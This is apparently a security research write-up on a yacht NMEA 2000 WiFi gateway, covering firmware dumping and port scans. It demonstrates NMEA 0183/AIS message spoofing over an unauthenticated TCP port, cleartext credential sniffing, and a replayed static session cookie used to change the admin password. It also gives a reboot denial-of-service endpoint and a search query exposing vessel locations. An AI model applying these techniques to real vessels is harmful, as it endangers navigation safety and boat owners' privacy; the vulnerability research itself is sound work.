# Penetration Testing of Yacth Devices NMEA 2000 Wifi Gateway and Processes

## 1. Reconnaissance

### 1.1 Physical Hardware

Front Side 

![Frontside of Gateway Device PCB](./assets/imgs/frontside.jpg)

Back Side

![Backside of Gateway Device PCB](./assets/imgs/backside.jpg)

After taking a look at the front side of the PCB, we can see that the device is using an [STM32F105RBT6](./assets/pdfs/en.CD00220364.pdf).

### 1.2 Firmware Analysis

File: [WUPDATE.BIN](./assets/WUPDATE/WUPDATE.BIN) comes from v1.72 of the firmware, and is the update file for the device, publicly available on the manufacturer's website.

Running binwalk gives us nothing:
```
binwalk WUPDATE.BIN

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
```
Evaluating the entropy of the file:

```
binwalk -E WUPDATE.BIN

DECIMAL       HEXADECIMAL     ENTROPY
--------------------------------------------------------------------------------
0             0x0             Rising entropy edge (0.972447)
120832        0x1D800         Rising entropy edge (0.977437)
```

This means that the file is either encrypted or compressed.

Let's take a look at the strings in the file:

```
strings WUPDATE.BIN | head
YDMG
1.72
*E$F
:KYb
qo7r&
!(hY}
@hK!W
dBQ1
N}*n
-#`hq
```
And again, we get nothing, but some random gibberish, and very few strings that make sense (like the version number).

Even over the WiFi update process, the firmware still seems encrypted or compressed (see [./assets/pcap](./assets/pcap/))

![entropy](./assets/imgs/entropy.png)

### 1.2.1 Attempt at Dumping the STM32 Firmware

Unfortunately, LQFP64 line is small, and soldering 30 AWG wire to the pads is hard (see below). 

![stm32-30awg](./assets/imgs/30%20AWG.jpg)

After many failed attempts of JTAGulating and resoldering, I decided to check the output of the device on boot:

![salea capture](./assets/imgs/salea.png)

This proves further that JTAG must've been disabled in the firmware, as there is no TCK (yellow), TDI is pulled high (green), TDO has no output (orange), NJTRST is pulled high (red). 

> Note: TMS is absent in this capture.

Even after pulling nJTRST low, the device still doesn't output anything on TDO. This means that JTAG is disabled somehow, because I am wired directly up to the microchip:

![salea pulled low](./assets/imgs/salea-pull-low.png)

#### ... let's move to the ESP8285, since we know it is the chip that is used for updates, and user interaction:

Found boot logs after performing a chip off, with the following pins connected:
ESP8285 Pin | Serial Adapter
|----------------|----------------|
VCC (3.3V) | 3.3V
GND | GND
TXD | RX
RXD | TX
GPIO0 | GND (for bootloader mode)
EN (RST) | 3.3V (pulled-up)

![bootlogs](./assets/imgs/bootlogs.png)

And after that, I got to enabling the bootloader mode, and dumping the firmware:

![esptool-windows](./assets/imgs/esptool-windows.png)

### 1.2.2 Actually dumping the firmware

The command in the image above didn't get me far, until I did the following:

Ran this command to extract the flash instead:
```
esptool.py -p PORT -b 115200 read_flash 0 ALL flash_contents.bin
```
> https://docs.espressif.com/projects/esptool/en/latest/esp8266/esptool/basic-commands.html

A copy of the firmware is available at [./assets/re/flash_contents.bin](./assets/re/flash_contents.bin).

But that doesn't render well in ghidra, so I used the following tool to convert it to an ELF file:

```
esp2elf flash_contents.bin flash_contents.elf
```

Hell yeah! Now ghidra can confirm the entry point we already figured out from using the esptool:

```
esptool image_info flash_contents.bin

esptool.py v4.8.1
File size: 2097152 (bytes)
Detected image type: ESP8266
Image version: 1
Entry point: 40100438
3 segments

Segment 1: len 0x00968 load 0x40100000 file_offs 0x00000008 [IRAM]
Segment 2: len 0x00308 load 0x3ffe8000 file_offs 0x00000978 [DRAM]
Segment 3: len 0x00278 load 0x3ffe8310 file_offs 0x00000c88 [DRAM]
Checksum: d8 (valid)
```

> https://github.com/esp8266/esp8266-wiki/wiki/Memory-Map

### 1.3 Network Scanning

```
nmap.exe --top-ports 1000 -Pn 192.168.4.1
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 14:17 Mountain Daylight Time
Nmap scan report for 192.168.4.1
Host is up (0.0054s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 4E:EB:D6:DE:83:3A (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
```
After connecting the device to the network as a client:
```
Nmap scan report for 192.168.10.71
Host is up (0.0063s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
490/tcp   filtered micom-pfs
1456/tcp  open     dca
1458/tcp  open     nrcabq-lm
20178/tcp filtered unknown
25715/tcp filtered unknown
36412/tcp filtered unknown
54978/tcp filtered unknown
61439/tcp filtered netprowler-manager
MAC Address: 4C:EB:D6:86:BA:CC (Espressif)
```

As an attacker, we could identify the two ports mentioned on the documentation (1456 is default NMEA 0183), and ncat to the device to see if we can get any data out of it:

```
ncat.exe 192.168.10.71 1456
$PCDIN,01F211,003A0605,6F,00475D64070000FF*53
$MXPGN,01F211,686F,00475D64070000FF*1C
$PCDIN,01F211,003A0FD3,6F,00475D64070000FF*51
$MXPGN,01F211,686F,00475D64070000FF*1C
$PCDIN,01F211,003A19A2,6F,00475D64070000FF*2B
$MXPGN,01F211,686F,00475D64070000FF*1C
$PCDIN,01F211,003A2370,6F,00475D64070000FF*56
$MXPGN,01F211,686F,00475D64070000FF*1C
```

Suprise! We can also send data to this port, since they mentioned in the documentation that the device can work bidirectionally (by default). 

## 2. Exploitation

### 2.1 NMEA 0183 Spoofing

> As mentioned in chapter `IV. Configuration of Application Protocols` the YDGW-02 "With the factory settings, Gateway has the Server #1 enabled and pre-configured to
use TCP port 1456 and the NMEA 0183 data protocol.."

This means by default we gain access to unencrypted NMEA 0183, which contains things like positioning, gps data, navigation info, wind and weather, heading and compass, and AIS target info.

If any other servers are turned on, data can be sent or received, based on the configuration by the user.

An example of what was used to send data to the device can be seen in the [test-nmea0183spoofer-default.sh](./assets/software/test-nmea0183spoofer-default.sh) file. The device converts the messages to NMEA 2000, and sends them out on the CAN bus, as seen in the [test-nmea0183spoofer-default.sh-results.txt](./assets/software/test-nmea0183spoofer-default.sh-results.txt) file. You can see that the source address stays the same (0x43).

Another script is also used to extensively test the default TCP port on 1456, and it is called [nmea0183-demo.sh](./assets/software/nmea0183-demo.sh). A converted output of the candump log can be seen in the [canboat-output-0183.txt](./assets/software/logs/canboat-output-0183.txt) file. If you have physical access to the N2K bus, it can be seen that the YDWG-02 also allows for sending AIS messages on the bus:

```
1970-01-01-00:00:20.347 4  67 255 129038 AIS Class A Position Report:  Message ID = Scheduled Class A position report; Repeat Indicator = Initial; User ID = "244698076"; Longitude = 19.9172333; Latitude = 51.2296366; Position Accuracy = High; RAIM = not in use; Time Stamp = 48; COG = 110.7 deg; SOG = 0.00 m/s; Communication State = 00 00 00; AIS Transceiver information = Channel A VDL reception; Heading = Unknown; Rate of Turn = 0.000 deg/s; Nav Status = Under way using engine; Special Maneuver Indicator = Not available; Sequence ID = Unknown
```

> Note: This was parsed using canboat's analyzer tool. 

We just spoofed an AIS message from the default port (1456) on the YDWG, which is widely used in the maritime industry for tracking vessels, and is used by the US Coast Guard to track vessels in the area.

## 2.2 NMEA 2000 Spoofing

If the user also turns on bidirectional communication on the n2k bus. This means we can send any arbitrary message to the bus, given the source address of the YDWG-02 (0x43). 

As a reminder, these ports are **NOT encrypted, or authenticated in any form**. This means that any attacker with access to the network can send arbitrary messages to the bus, and potentially spoof the devices on the bus (which was proven from the [nmea2k-compass-spoofer.sh](./assets/software/nmea2k-compass-spoofer.sh) file).

From there we can see some actual physical command and control of the devices on the bus:

TODO: insert gif of spoofing the compass.

TODO: insert gif of spoofing the gps?

### 2.3 Web Application Analysis

The web application is hosted on port 80 (unencrypted HTTP). More information about the web application was found through analysis of the firmware update mechanisms (see [./assets/pcap](./assets/pcap/) and the extracted contents of the firmware file [./assets/binwalk/_flash_contents.bin.extracted](./assets/binwalk/_flash_contents.bin.extracted)).

#### 2.3.1 Burp Suite

Some of the analsysis was done using the device as an AP, and some of the analysis was done using the device as a client. If the device is in AP mode, the device is technically more secure, but in client mode, if the device is connected to a public wifi network, it is **much more** vulnerable to attacks, as shown in the following sections.

#### 2.3.1.1 Authentication Bypass

After loging into the YDGW gateway, we can see cleartext credentials pass through an HTTP request, handled by AJAX:

```http
POST /login?1=1&login=admin&password=admin HTTP/1.1
Host: 192.168.4.1
Content-Length: 0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Origin: http://192.168.4.1
Referer: http://192.168.4.1/login.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

This means we can easily spin up wireshark, and capture the traffic to see the credentials in cleartext.

which is handled by the following JavaScript:
```javascript
function login(e){
	e.preventDefault();
    var url = "/login?1=1";

    url += "&login=" + $("#login").value.trim().toLowerCase();
    url += "&password=" + $("#password").value.trim();
    var r = findGetParameter("r");    

    var button = $("#login-button");
    addClass(button, "pure-button-disabled");

    ajaxReq("POST", url, function (resp) {
        removeClass(button, "pure-button-disabled");
        if(r !== null)
        	window.location = r
        else
        	window.location = "/home.html"
    }, function (s, st) {
        showWarning("Invalid credentials");
        removeClass(button, "pure-button-disabled");
    });
}
```

This means that we could possibly brute force the credentials since there is no Web Application Firewall (WAF), and gain access to the device. As a reminder the default credentials are `admin:admin` in the web application.

#### 2.3.1.2 Sniffing Access Point Credentials

Given we are connected to the same network as the YDWG-02, we can see the credentials for the access point in cleartext, and we can also see that the device is using a weak password (123456578).

```http
POST /wifi/apchange?100=1&ap_ssid=YDWG&ap_password=123456578&ap_authmode=4&ap_hidden=0 HTTP/1.1
Host: 192.168.4.1
Content-Length: 0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Origin: http://192.168.4.1
Referer: http://192.168.4.1/point.html
Accept-Encoding: gzip, deflate, br
Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997
Connection: keep-alive
```
which is handled by the following JavaScript:
```javascript
function changeApSettings(e) {
  e.preventDefault();
  var url = "/wifi/apchange?100=1";
  var i, inputs = document.querySelectorAll("#" + e.target.id + " input,select");
  for (i = 0; i < inputs.length; i++) {
    if (inputs[i].type == "checkbox") {
      var val = (inputs[i].checked) ? 1 : 0;
      url += "&" + inputs[i].name + "=" + val;
    } else {
      var clean = inputs[i].value.replace(/[^!-~]/g, "");
      var comp = clean.localeCompare(inputs[i].value);
      if ( comp != 0 ){
        showWarning("Invalid characters in " + specials[inputs[i].name]);
        return;
      }
      url += "&" + inputs[i].name + "=" + clean;
    }
  };
```

Let's say we are connected to the device in AP mode, and we want to connect to a public wifi network (like McDonald's). We can see the credentials for the access point in cleartext.

```http
POST /wifi/connect?essid=<redacted>&passwd=<redacted> HTTP/1.1
Host: 192.168.4.1
Content-Length: 0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Origin: http://192.168.4.1
Referer: http://192.168.4.1/client.html
Accept-Encoding: gzip, deflate, br
Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997
Connection: keep-alive
```
which is handled by the following JavaScript:
```javascript
function changeWifiAp(e) {
  e.preventDefault();
  var passwd = $("#wifi-passwd").value;
  var essid = getSelectedEssid();
  showNotification("Connecting to " + essid);
  var url = "/wifi/connect?essid="+encodeURIComponent(essid)+"&passwd="+encodeURIComponent(passwd);

  hideWarning();
  $("#reconnect").setAttribute("hidden", "");
  $("#wifi-passwd").value = "";
  var cb = $("#connect-button");
  var cn = cb.className;
  cb.className += ' pure-button-disabled';
  blockScan = 1;
  ajaxSpin("POST", url, function(resp) {
      $("#spinner").removeAttribute('hidden'); // hack
      showNotification("Waiting for network change...");
      window.scrollTo(0, 0);
      attempts = 0;	
      window.setTimeout(getStatus, 2000);
    }, function(s, st) {
      showWarning("Error switching network: "+st);
      cb.className = cn;
      window.setTimeout(scanAPs, 1000);
    });
}
```

This means that we can easily spin up wireshark, and capture the traffic in the public McDonald's wifi (given the device is setup in client mode), and see the credentials in cleartext.

#### Cloud Application

The device can also be configured to send data to a cloud service, which is not encrypted, and can be intercepted by an attacker on the same network. The cloud service was not tested, and out of the scope for this project, but it is worth mentioning that, from the manufacturer's documentation, that a "secret" link can be created. This link is encrypted, but for example, as simple google search for `"site:cloud.yachtd.com/s/"` gives us access to secret links that expose locations of vessels, and other sensitive information.

Nonetheless, the key that is used to for boats on the cloud service is also sent in cleartext, and can be intercepted by an attacker on the same network.

```http
POST /settings/upd_ul?1=1&interval=300&priority=0&dataset=7&range=0&key=Bank$Catamaran^Ghosting^Wash$Lookout*SoX HTTP/1.1
Host: 192.168.10.71
Content-Length: 0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Origin: http://192.168.10.71
Referer: http://192.168.10.71/logging.html
Accept-Encoding: gzip, deflate, br
Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997
Connection: keep-alive
```
which is handled by the following JavaScript:
```javascript
function setSettings(e,url) {
    e.preventDefault();
    var i, inputs = document.querySelectorAll("#" + e.target.id + " input,select");
    for (i = 0; i < inputs.length; i++) {
        if (inputs[i].type === "checkbox") {
            var val = (inputs[i].checked) ? 1 : 0;
            url += "&" + inputs[i].id + "=" + val;
        }
	else if (inputs[i].type === "text")
	{
  	    url += "&" + inputs[i].id + "=" + inputs[i].value.trim();
	}
        else
            url += "&" + inputs[i].id + "=" + inputs[i].value;
    };

    hideWarning();
    var n = e.target.id.replace("-form", "");
    var cb = $("#" + n + "-button");
    addClass(cb, "pure-button-disabled");
    ajaxSpin("POST", url, function (resp) {
        showNotification(n + " settings was updated");
        removeClass(cb, "pure-button-disabled");
    }, function (s, st) {
        showWarning("Error: " + st);
        removeClass(cb, "pure-button-disabled");
        window.setTimeout(fetchSettings, 100);
    });
}

function setULSettings(e) {
    var url = "/settings/upd_ul?1=1";
    setSettings(e,url);
    fetchSettings();	
}
```

### 2.3.2 OWASP ZAP

#### 2.2.2.1 XSS Vulnerability

#### 2.2.2.2 Clickjacking Vulnerability

#### 2.2.2.3 API Vulnerabilities

| Endpoint | Description |
|----------|-------------|
| /flash/reboot | Reboot the device. This can be used to perform a denial of service attack on the device. |


```
GET /settings/logging HTTP/1.1
Host: 192.168.235.25
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Referer: http://192.168.235.25/logging.html
Accept-Encoding: gzip, deflate, br
Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997
Connection: keep-alive
```
and
```
HTTP/1.0 200 OK
Server: YDWG
Connection: close
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: application/json

{ "interval": "300", "points" : 16256, "priority" : 0, "dataset" : 7, "distance" : "true", "range" : 0, "key" : "Prolonged_blast$Pilot_boat*Fix~R2ushnLqH", "status" : "2025-05-02 20:42:19 Data uploaded (last point GMT 2024-12-19 21:58:00)", "has_points" : "false"}
```
paired with
```
GET /version HTTP/1.1
Host: 192.168.235.25
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Referer: http://192.168.235.25/flash.html
Accept-Encoding: gzip, deflate, br
Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997
Connection: keep-alive
```
and
```
HTTP/1.0 200 OK
Server: YDWG
Connection: close
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: application/json

{ "version": "1.74", "sn": "00604470", "hardware": "1.00", "build": "43" }
```

Talk about AIS spoofing future work.

Try out cloud service.

### Cookie Injection

This seems to be the only cookie to exist: 
```
Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997
```
So we inject it into the request, and see if we can get a response:

```
POST /admin/changepassword?1=1&password=admin HTTP/1.1
Host: 192.168.10.71
Content-Length: 0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Origin: http://192.168.10.71
Referer: http://192.168.10.71/admin.html
Accept-Encoding: gzip, deflate, br
Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997
Connection: keep-alive
```
and we get a 200 OK response, which means that the cookie is valid, and we can use it to perform actions on the device, like changing the admin password:
```
HTTP/1.0 204 OK
Server: YDWG
Connection: close
Set-Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997; path=/; expires=Tue, 7 Apr 2038 12:25:11; 
```

![cookie injection](./assets/imgs/cookie-injected-success.png)

![wireshark](./assets/imgs/wireshark.png)

We can also literally see the password too!

TODO: test this on a device we don't own.. see if it persists across devices. We already know it persists across reboots, but does it persist across devices?

#

# FAQ

## 1. I want to test this on my own, but the scripts are not working for me.

Try:

```
dos2unix <script_name>
```

Unfortunately, the scripts were written on both linux and windows machines, and git auto converts them.